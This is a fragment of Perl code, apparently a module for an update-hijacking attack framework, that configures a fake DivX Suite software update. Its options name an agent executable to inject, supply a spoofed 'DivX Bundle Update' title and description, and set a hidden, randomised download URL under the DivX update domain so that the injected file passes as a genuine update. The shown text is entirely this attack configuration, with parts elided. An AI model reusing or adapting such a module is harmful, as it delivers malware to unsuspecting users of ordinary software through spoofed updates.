...
my $base=
{
    ...
    'description' => qq{DIVX Suite ( Player, WebPlayer, Codec Converter, DrDivX},   
    ...
    'options' => {  'agent'  => { 'val' => './agent/agent.exe', 'desc' => 'Agent to inject'},
    		    'enable' => { 'val' => 1, 
                    ...
                    'update_engine_version' => { 'val' => '1.1.1',
                				 'desc' => ' DivX Update Engine Version' },
	            'update_title' => { 'val' => ' DivX Bundle Update',
	                                'desc' => ' Update title ' },			         
                    'version' => { 'val' => '10.1.1',
                                   'desc' => 'Product Version' },     
                    'description' =>  { 'val' => 'Upgrade to DivX 6 and experience the new DivX Player, DivX Codec and DivX 
                    ...
                    'url'  => { 'val' => "'http://versions.divx.com/divx/autoupdateC/'.isrcore::utils::RndAlpha(isrcore::utils::RndNum(1)).'.exe'",
                                 'hidden' => 1,
				'dynamic' =>1,},                                                                                       			    	  
	            'size' => { 'val' => " '2'.isrcore::utils::RndNum(7) ",
	                      'dynamic' => 1 },                                                        				                                                                    			    	  
		 }
};
